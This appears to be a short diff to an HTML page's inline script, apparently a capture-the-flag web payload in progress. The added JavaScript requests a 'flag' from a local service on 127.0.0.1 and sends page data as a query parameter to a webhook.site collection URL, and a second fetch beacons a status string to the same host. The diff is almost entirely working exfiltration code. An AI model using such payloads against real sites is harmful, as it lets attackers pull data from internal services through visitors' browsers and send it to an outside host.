@@ -7,8 +7,16 @@
     </head>
     <body>
         <script>
+            fetch("127.0.0.1:51014/flag").then((response) => {
+                response.text().then((text) => {
+                    fetch(
+                        "https://webhook.site/227c86cb-edca-4cde-8f7c-1c224c6f1eb4?lol=" + document.body.innerText[0]
+                    );
+                });
+            });
+            
             fetch(
-                "https://webhook.site/227c86cb-edca-4cde-8f7c-1c224c6f1eb4?lol=" + "amongusss"
+                "https://webhook.site/227c86cb-edca-4cde-8f7c-1c224c6f1eb4?lol=" + "completted"
             );
         </script>
     </body>
